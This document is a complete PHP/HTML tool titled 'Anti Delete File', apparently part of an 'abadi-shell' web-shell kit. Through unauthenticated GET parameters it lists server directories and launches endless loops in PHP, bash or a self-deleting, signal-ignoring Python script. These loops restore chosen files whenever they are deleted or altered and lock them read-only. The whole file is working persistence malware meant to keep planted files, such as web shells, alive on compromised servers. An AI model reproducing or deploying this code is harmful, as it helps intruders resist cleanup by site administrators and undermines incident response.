<?php
ignore_user_abort(true);
set_time_limit(0);
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);
$type_ = $_GET['type'] ? $_GET['type'] : false;
if ($type_ == 'api') {
  header('Content-Type: application/json');
  if (is_writable("/var/tmp/")) {
    $tmpFile = "/var/tmp/x7-" . md5("abadi-shell.json");
  } else {
    $tmpFile = sys_get_temp_dir() . '/x8-' . md5("abadi-shell.json");
  }
  $action = $_GET['action'] ? $_GET['action'] : false;
  if ($action == 'get_dir') {
    $dir = isset($_GET['dir']) ? $_GET['dir'] : __DIR__;

    $files = scandir($dir);
    $files = array_diff($files, array('.', '..'));

    $contentTmp = file_get_contents($tmpFile);
    $result = array();
    foreach ($files as $file) {
      $path = $dir . '/' . $file;
      $type = is_dir($path) ? 'dir' : 'file';
      if (stristr($contentTmp, md5($path))) {
        $status = 1;
      } else {
        $status = 0;
      }
      $result[] = array(
        'name' => $file,
        'type' => $type,
        'dir' => $dir,
        'permission' => substr(sprintf('%o', fileperms($path)), -4),
        'modified' => date('Y-m-d H:i:s', filemtime($path)),
        'status' => $status
      );
    }
    echo json_encode($result);
  } else if ($action == 'start_loop' and isset($_GET['pathFile'])) {
    $pathFile = $_GET['pathFile'];
    $method = $_GET['method'] ? $_GET['method'] : 1;
    if (!is_file($pathFile)) {
      echo "File not found : " . $pathFile;
    } else if (stristr(@file_get_contents($tmpFile), md5($pathFile))) {
      echo "Script was executed [$tmpFile] : \n" . file_get_contents($tmpFile);
    } else if ($_GET['method'] == 2 and !function_exists('system')) {
      echo "disable function";
      die();
    } else {
      $dirFile  = dirname($pathFile);
      $fileContent = @file_get_contents($pathFile);
      $hashFile = md5($pathFile);
      if ($method == 1) {
        @file_put_contents($tmpFile, "$hashFile-1-$method\n", FILE_APPEND | LOCK_EX);
        while (True) {
          if (!file_exists($dirFile)) { //file_exists its same like is_dir
            @mkdir($dirFile, 0755, true);
          }
          if (!file_exists($pathFile) or $hashFile != @md5($pathFile)) {
            $op = @fopen($pathFile, 'w');
            @fwrite($op, $fileContent);
            @fclose($op);
            $hashFile = md5($pathFile);
          }
          sleep(3);
        }
      } else if ($method == 2) {
        @file_put_contents($tmpFile, "$hashFile-1-$method\n", FILE_APPEND | LOCK_EX);
        $cmd = <<<SH
#!/bin/bash

dirFile=$(dirname "$pathFile")
fileContent=$(cat "$pathFile")
hashFile=$(md5sum "$pathFile" | awk '{print $1}')

while true; do
  if [ ! -d "$dirFile" ]; then
    mkdir -p "$dirFile"
  fi

  if [ ! -e "$pathFile" ] || [ "\$hashFile" != "$(md5sum "$pathFile" | awk '{print $1}')" ]; then
    echo "\$fileContent" > "$pathFile"
    hashFile=$(md5sum "$pathFile" | awk '{print $1}')
  fi

  sleep 3
done
SH;
        // exec($cmd);
        system($cmd);
      } else if ($method == 3) {
        if (!function_exists('system')) {
          echo "disable function";
          die();
        }
        @file_put_contents($tmpFile, "$hashFile-1-$method\n", FILE_APPEND | LOCK_EX);
        $cmd = <<<SH
import os, hashlib, time, signal

def signal_handler(signal, frame):
    print('Signal received, but I am not stopping')

# Set the signal handler
signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def get_md5_hash(file_path):
    md5_hash = hashlib.md5()
    with open(file_path, "rb") as file:
        for chunk in iter(lambda: file.read(4096), b""):
            md5_hash.update(chunk)
    return md5_hash.hexdigest() 

# if len(sys.argv) < 2:
#     print("Usage: python3 <file>.py <pathFile>")
#     sys.exit(1)
# elif not os.path.isfile(sys.argv[1]):
#     print("File not found")
#     sys.exit(1)

os.remove(__file__)

# print(sys.argv)
pathFile = '$pathFile' # sys.argv[1]

filename = os.path.basename(pathFile)
directory = os.path.dirname(pathFile)
fileContent = open(pathFile, 'r').read()
hashFile = get_md5_hash(pathFile)
# print(directory, filename, hashFile)

while True:

    # check and makesure directory is exist
    if not os.path.exists(directory):
        print("[!] Directory not found")
        print("[!] Creating directory")
        os.makedirs(directory)
    
    # check and makesure file is exist and hash is same
    if not os.path.isfile(pathFile) or hashFile != get_md5_hash(pathFile):
        print("[!] File not found / Hash is not same")
        print("[!] Creating file")
        with open(pathFile, 'w') as file:
            file.write(fileContent)
        print("[!] Setting file mode to 0444")
        os.chmod(pathFile, 0o444)  # Set file mode to 0444

    time.sleep(4)
    # break
SH;
        $tmpfile = sys_get_temp_dir() . '/x7-' . md5(rand(5, 90)) . '.py';
        $fo = fopen($tmpfile, 'w');
        fwrite($fo, $cmd);
        fclose($fo);
        echo "$tmpfile;";
        system("chmod +x $tmpfile");
        system("python $tmpfile");
      }
    }
    die();
  }
  die();
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'>
  <title>Anti Delete File</title>
  <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@300&display=swap');

    h1 {
      font-family: 'Oswald', sans-serif;
    }

    .pointer {
      cursor: pointer;
    }

    .bg5 {
      background-color: #141618 !important;
    }
  </style>
</head>
</head>

<body data-bs-theme="dark">
  <div id="app" class="container pt-2">
    <div class="w-100 text-center">
      <h1>Anti Delete File</h1>
    </div>
    <div>
      <span>Current Directory: </span>
      <span class="pointer" v-for="(segment, index) in pathSegments">
        <a @click="changeDir(index)">{{ segment }}</a>
        <span v-if="index < pathSegments.length - 1"> / </span>
      </span>
      <span class="pointer">
        [
        <a @click="changeDirRoot">Home</a>
        ]
      </span>
    </div>
    <table v-if="!isLoading" class="table table-sm table-hover">
      <thead>
        <tr>
          <th>Filename</th>
          <th>Type</th>
          <th>Permission</th>
          <th>Modified</th>
        </tr>
      </thead>
      <tbody>
        <tr v-for="item in items" :key="item.name">
          <td :class="{bg5:item.status}" class="pointer" @click="toggleSelected(item)" v-if="item.type === 'file'">
            <img src="https://i.ibb.co/31Ptbb0/icons8-file-48.png" width="19">
            {{ item.name }}
          </td>
          <td :class="{bg5:item.status}" class="pointer" @click="loadDir(item)" v-else>
            <img src="https://img.icons8.com/?size=512&id=12775&format=png" width="19">
            {{ item.name }}
          </td>
          <td :class="{bg5:item.status}" class="pointer text-capitalize" @click="toggleSelected(item)">{{ item.type }}</td>
          <td :class="{bg5:item.status}" class="pointer" @click="toggleSelected(item)">{{ item.permission }}</td>
          <td :class="{bg5:item.status}" class="pointer" @click="toggleSelected(item)">{{ item.modified }}</td>
        </tr>
      </tbody>
    </table>
    <p v-else>Loading...</p>
    <div class="mb-5">
      <div v-if="selected.length>0">
        <h4>Selected Files:</h4>
        <ul>
          <li v-for="file in selected" :key="file.name">{{file.dir}}/{{file.name }}</li>
        </ul>
      </div>
    </div>
    <div v-if="selected.length>0" class="mb-5 pb-3">
      <button class="btn btn-danger btn-sm" @click="AntiDelete(1)">Start Anti Delete! [Method 1]</button>
      <button class="btn btn-danger btn-sm" @click="AntiDelete(2)">Start Anti Delete! [Method 2]</button>
      <button class="btn btn-danger btn-sm" @click="AntiDelete(3)">Start Anti Delete! [Method 3 (Python)]</button>
    </div>
  </div>

  <script>
    new Vue({
      el: '#app',
      data() {
        return {
          rootDir: '<?= __DIR__ ?>',
          currentDir: '<?= __DIR__ ?>',
          items: [],
          isLoading: false,
          selected: [],
          green: "linear-gradient(to right, #00FF00, #008000)",
          red: "linear-gradient(to right, #FF0000, #FF4500)",
        };
      },
      computed: {
        pathSegments() {
          return this.currentDir.split('/');
        }
      },
      mounted() {
        // Mendapatkan query string dari URL
        var queryString = window.location.search;
        // Buat objek URLSearchParams dengan query string
        var params = new URLSearchParams(queryString);
        // Mendapatkan nilai parameter dengan nama 'dir'
        var dirValue = params.get('dir');
        if (dirValue) {
          this.currentDir = dirValue;
        } else {
          this.currentDir = this.rootDir;
        }

        this.changeQuery('dir', this.currentDir);
        this.getItems();
      },
      methods: {
        AntiDelete(method) {
          this.toast('Starting Anti Delete...');
          for (let i = 0; i < this.selected.length; i++) {
            const item = this.selected[i];
            console.log(item);
            try {
              axios.get('?', {
                  params: {
                    pathFile: item.dir + '/' + item.name,
                    action: 'start_loop',
                    type: 'api',
                    method: method
                  },
                  timeout: 5000 // Waktu tunggu 5 detik (5000 milidetik)
                })
                .then(response => {
                  if (response.status == 200 && response.data.includes('was executed')) {
                    this.toast(item.dir + '/' + item.name + ' The script was executed!', this.red);
                  } else if (response.status == 200 && response.data.includes('disable function')) {
                    this.toast(item.dir + '/' + item.name + ' disable function!', this.red);
                  } else {
                    this.toast('Error: ' + item.dir + '/' + item.name, this.red);
                  }
                })
                .catch(error => {
                  this.toast('Success: ' + item.dir + '/' + item.name, this.green);
                  this.getItems();
                });
            } catch (e) {
              // this.toast('Error', this.red);
            }
          }

        },
        toast(text = "HI!", bg) {
          Toastify({
            text: text,
            newWindow: true,
            close: true,
            gravity: "top",
            position: "right",
            style: {
              background: bg,
            },
          }).showToast();
        },
        loadDir(item) {
          this.currentDir = item.dir + '/' + item.name;
          this.changeQuery('dir', this.currentDir);
          this.getItems();
        },
        changeQuery(name, value) {
          var currentUrl = new URL(window.location.href);
          currentUrl.searchParams.set(name, value);
          window.history.replaceState(null, null, currentUrl.href);
        },
        getItems() {
          this.isLoading = true;
          axios.get('?', {
              params: {
                dir: this.currentDir,
                action: 'get_dir',
                type: 'api'
              }
            })
            .then(response => {
              this.items = response.data;
              this.isLoading = false;
            })
            .catch(error => {
              console.error(error);
              this.isLoading = false;
            });
        },
        goBack() {
          if (this.currentDir !== this.rootDir) {
            const segments = this.currentDir.split('/');
            segments.pop();
            this.currentDir = segments.join('/');
            this.getItems();
          }
        },
        changeDir(index) {

          const segments = this.pathSegments.slice(0, index + 1);
          this.currentDir = segments.join('/');
          this.getItems();
          this.changeQuery('dir', this.currentDir);
        },
        changeDirRoot() {
          this.currentDir = this.rootDir;
          this.getItems();
          this.changeQuery('dir', this.currentDir);
        },
        toggleSelected(item) {
          const file = this.currentDir + item.name
          const index = this.selected.indexOf(item);
          if (index === -1) {
            this.selected.push(item);
          } else {
            this.selected.splice(index, 1);
          }
        }
      }
    });
  </script>
</body>

</html>